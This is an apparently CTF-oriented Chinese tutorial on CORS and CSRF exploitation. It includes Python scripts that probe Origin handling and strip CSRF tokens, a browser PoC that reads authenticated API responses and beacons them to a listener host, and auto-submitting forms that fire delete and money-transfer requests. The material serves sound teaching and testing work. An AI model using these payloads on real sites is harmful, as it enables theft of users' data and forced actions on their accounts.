---
id: "ctf-website/07-client/cors-csrf"
title: "CORS / CSRF 高级攻击"
title_en: "Advanced CORS / CSRF Attacks"
summary: >
  CORS/CSRF 题面的核心是把 Origin、credentials、preflight、ACAO/ACAC、SameSite、CSRF token 与业务副作用放在同一个 oracle 中比较。本篇给出跨域读取判定矩阵、Origin 变体生成器、preflight 探测、CSRF token 单变量突变、SameSite Lax 状态动作、JSON/text/plain CSRF 和 Evidence 模板。
summary_en: >
  CORS/CSRF challenges require comparing Origin, credentials, preflight, ACAO/ACAC, SameSite, CSRF tokens, and business side effects in one oracle. Includes cross-origin read matrices, Origin variant generators, preflight probes, CSRF token mutation, SameSite Lax state actions, JSON/text/plain CSRF, and evidence templates.
board: "ctf-website"
category: "07-client"
signals: ["CORS", "CSRF", "SameSite", "跨域请求", "跨站请求伪造", "ACAO", "ACAC", "csrf token bypass", "preflight"]
mcp_tools: ["http_probe", "kb_router", "jshook"]
keywords: ["CORS", "CSRF", "SameSite Cookie", "跨域读取", "CSRF token绕过", "null origin", "JSON CSRF", "preflight"]
difficulty: "advanced"
tags: ["cors", "csrf", "client-side", "authentication", "ctf"]
language: "zh-CN"
last_updated: "2026-07-04"
related_articles: ["ctf-website/07-client/admin-bot-xss", "ctf-website/02-auth/jwt/07-theft-replay"]
---
# CORS / CSRF 高级攻击

CORS 决定跨域 JS 能不能读响应，CSRF 决定跨站页面能不能借浏览器状态触发动作。实战里两者经常相互接力：CORS 读 token，CSRF 打状态动作；XSS/admin bot 又能把两条线合并。

## 输入信号

| 信号 | 立即动作 | 命中样本 | 失败样本 |
|---|---|---|---|
| 响应有 `Access-Control-Allow-Origin` | Origin 变体 + credentials oracle | 反射 attacker origin 且 `ACAC=true` | 只允许固定白名单 |
| 接口接受 Cookie 会话 | 带/不带 credentials 对比 | 跨域读到 `/api/me`、订单、flag | 响应不含认证态 |
| `Origin: null` 被允许 | sandbox iframe/data/file origin | null origin 读到认证响应 | null 明确拒绝 |
| CSRF token 在 HTML/API 中 | 先读 token，再单变量突变动作 | token 可复用/跨用户/空值通过 | token 绑定 session+动作 |
| SameSite=Lax/缺失 | GET 导航和 top-level form | 状态动作被触发 | SameSite/Origin/Token 阻断 |
| JSON API 无 token | text/plain、form、simple request 绕 preflight | 状态变化或业务响应推进 | preflight 或 content-type 校验 |

## 工作流

```text
建立同源 baseline
  → Origin/credentials/preflight 变体扫描
  → 判断能读响应还是只能触发动作
  → 抽 CSRF token 与 SameSite 行为
  → 单变量重放状态动作
  → 将响应读取、业务副作用和失败样本写入 Evidence
```

## 0. 判定矩阵

| ACAO | ACAC | Cookie 是否发出 | JS 能否读 | 价值 |
|---|---|---|---|---|
| 反射 attacker origin | `true` | 是 | 是 | 可读认证响应 |
| `*` | 无/false | 否或无关 | 是 | 只能读公开 API |
| `null` | `true` | 是 | 是 | sandbox/data/file origin 路线 |
| 固定 trusted origin | `true` | 是 | 否 | 找白名单匹配绕过 |
| 无 ACAO | 任意 | 是 | 否 | 转 CSRF 状态动作 |

## 1. Origin 与 preflight oracle

```python
#!/usr/bin/env python3
import argparse
import hashlib
import json
import requests
from urllib.parse import urlparse

def host(url):
    return urlparse(url).netloc

def h(text):
    return hashlib.sha256(text.encode("utf-8", errors="ignore")).hexdigest()[:16]

def origins(base):
    hn = host(base)
    return [
        "null",
        f"https://evil.{hn}",
        f"https://{hn}.attacker.example",
        f"http://{hn}",
        f"https://{hn.replace('.', '-')}.attacker.example",
        "https://attacker.example",
    ]

def probe(url, origin, method="GET", cookie=""):
    headers = {"Origin": origin}
    if cookie:
        headers["Cookie"] = cookie
    r = requests.request(method, url, headers=headers, timeout=10)
    return {
        "origin": origin,
        "method": method,
        "status": r.status_code,
        "hash": h(r.text),
        "acao": r.headers.get("Access-Control-Allow-Origin", ""),
        "acac": r.headers.get("Access-Control-Allow-Credentials", ""),
        "vary": r.headers.get("Vary", ""),
        "sample": r.text[:160],
    }

def preflight(url, origin, req_method="POST", req_headers="content-type,x-csrf-token"):
    r = requests.options(url, headers={
        "Origin": origin,
        "Access-Control-Request-Method": req_method,
        "Access-Control-Request-Headers": req_headers,
    }, timeout=10)
    return {
        "origin": origin,
        "status": r.status_code,
        "acao": r.headers.get("Access-Control-Allow-Origin", ""),
        "acam": r.headers.get("Access-Control-Allow-Methods", ""),
        "acah": r.headers.get("Access-Control-Allow-Headers", ""),
        "acac": r.headers.get("Access-Control-Allow-Credentials", ""),
    }

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", required=True)
    ap.add_argument("--cookie", default="")
    args = ap.parse_args()
    for o in origins(args.url):
        print(json.dumps({"simple": probe(args.url, o, cookie=args.cookie), "preflight": preflight(args.url, o)}, ensure_ascii=False))

if __name__ == "__main__":
    main()
```

成功样本：attacker origin 被反射，`ACAC=true`，带 cookie 的响应 hash 与同源 baseline 一致或包含用户字段。失败样本：只有公开字段、无 ACAC、preflight 不允许目标 method/header。

## 2. 浏览器 PoC 模板

```html
<!doctype html>
<script>
async function run() {
  const target = "https://target.example/api/me";
  const r = await fetch(target, {credentials: "include"});
  const t = await r.text();
  navigator.sendBeacon("https://listener.example/cors", JSON.stringify({
    status: r.status,
    type: r.type,
    body: t.slice(0, 2000)
  }));
}
run().catch(e => navigator.sendBeacon("https://listener.example/cors-err", String(e)));
</script>
```

如果浏览器 console 显示 CORS error，但服务端状态已经变化，这不是 CORS 读取，而是 CSRF 状态动作路线。

## 3. CSRF token 变体

| 变体 | 操作 | 命中样本 | 失败样本 |
|---|---|---|---|
| remove | 删除 token 字段/header | 动作成功 | `csrf missing` |
| empty | token 置空/`null` | 动作成功 | `csrf invalid` |
| reuse | 同一 token 重放多次 | 多次成功 | 一次后失效 |
| cross-user | A token 给 B session | B 动作成功 | session mismatch |
| cross-action | profile token 打 transfer | 动作成功 | action mismatch |
| method flip | POST 改 GET/PUT/override | 状态变化 | method 拒绝 |
| content-type flip | JSON 改 text/plain/form | 状态变化 | strict content-type |

```python
#!/usr/bin/env python3
import argparse
import copy
import hashlib
import json
import requests

def h(text):
    return hashlib.sha256(text.encode("utf-8", errors="ignore")).hexdigest()[:16]

def variants(body, token_name):
    yield "baseline", body
    b = copy.deepcopy(body); b.pop(token_name, None); yield "remove_token", b
    for v in ("", None, "0", "undefined"):
        b = copy.deepcopy(body); b[token_name] = v; yield f"token={v}", b

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", required=True)
    ap.add_argument("--cookie", default="")
    ap.add_argument("--body", required=True, help="JSON body")
    ap.add_argument("--token-name", default="csrf_token")
    args = ap.parse_args()
    sess = requests.Session()
    if args.cookie:
        sess.headers["Cookie"] = args.cookie
    base = json.loads(args.body)
    for name, b in variants(base, args.token_name):
        r = sess.post(args.url, json=b, timeout=10)
        print(json.dumps({"case": name, "status": r.status_code, "hash": h(r.text), "sample": r.text[:180]}, ensure_ascii=False))

if __name__ == "__main__":
    main()
```

## 4. SameSite 与 simple request

```html
<!-- SameSite=Lax: top-level GET/navigation 常带 cookie，适合找 GET 状态动作 -->
<a id=x href="https://target.example/api/delete?id=123">go</a>
<script>x.click()</script>

<!-- text/plain 避免预检；后端若宽松解析 JSON-like body，可触发动作 -->
<form method="POST" action="https://target.example/api/transfer" enctype="text/plain">
  <textarea name='{"to":"attacker","amount":1000,"x":"'>x"}</textarea>
  <button>go</button>
</form>
<script>document.forms[0].submit()</script>
```

判定：SameSite 路线看的是状态变化，不要求 JS 能读响应；CORS 路线看的是响应可读。两者不要混在同一个结论里。

## 攻击链

```text
CORS 反射 + ACAC
  → 跨域读 /api/me 或 CSRF token
  → 带 token 打状态动作
  → 外带业务响应或 flag

CSRF simple request
  → 借浏览器 cookie 触发状态动作
  → 用状态查询/回调/邮件/订单页确认副作用
```

## Evidence

| 项 | 记录内容 |
|---|---|
| CORS baseline | URL、Origin、ACAO、ACAC、Vary、preflight 结果 |
| 凭据行为 | Cookie 是否随请求、JS 是否能读 body、响应 hash |
| CSRF 变体 | token 删除/空值/复用/跨用户/跨动作/method/content-type |
| SameSite | cookie 属性、导航方式、method、状态动作结果 |
| 成功样本 | 跨域读到认证数据/token/flag，或跨站动作产生可复查副作用 |
| 失败样本 | CORS error 且无副作用、token mismatch、preflight 拒绝、SameSite 不带 cookie |
| 下一跳 | 读到 JWT 转 `02-auth/jwt`；读到前端状态转 `admin-bot-xss`；业务动作转支付/IDOR |

## MCP 工具映射

| 步骤 | MCP 工具 | 说明 |
|---|---|---|
| CORS 头探测 | `http_probe` | 固定 Origin/credentials/preflight 变体 |
| 浏览器 PoC | `jshook` | 验证 JS 是否能读 body、是否有副作用 |
| 知识路由 | `kb_router` | 按 CORS、CSRF、SameSite、preflight 信号搜索 |
